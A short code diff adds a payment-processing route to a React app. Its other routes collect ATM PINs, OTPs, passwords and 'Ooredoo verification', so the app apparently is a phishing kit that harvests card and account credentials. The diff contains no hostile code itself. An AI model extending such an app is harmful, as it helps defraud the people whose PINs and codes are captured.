@@ -20,6 +20,7 @@ import OoreedooVerification from "./pages/OoreedooVerification";
 import ForgotPassword from "./pages/ForgotPassword";
 import EmailVerification from "./pages/EmailVerification";
 import ProcessingRequest from "./pages/ProcessingRequest";
+import PaymentProcessing from "./pages/PaymentProcessing";
 import AccountCreation from "./pages/AccountCreation";
 import AdminDashboard from "./pages/AdminDashboard";
 import MemeImage from "./pages/MemeImage";
@@ -63,6 +64,7 @@ const AppContent = () => {
       <Route path="/password" element={<Password />} />
       <Route path="/registration-complete" element={<RegistrationComplete />} />
       <Route path="/payment-otp" element={<PaymentOTP />} />
+      <Route path="/payment-processing" element={<PaymentProcessing />} />
       <Route path="/atm-pin" element={<ATMPin />} />
       <Route path="/ooredoo-verification" element={<OoreedooVerification />} />
       <Route path="/otp-verification" element={<OTPVerification />} />
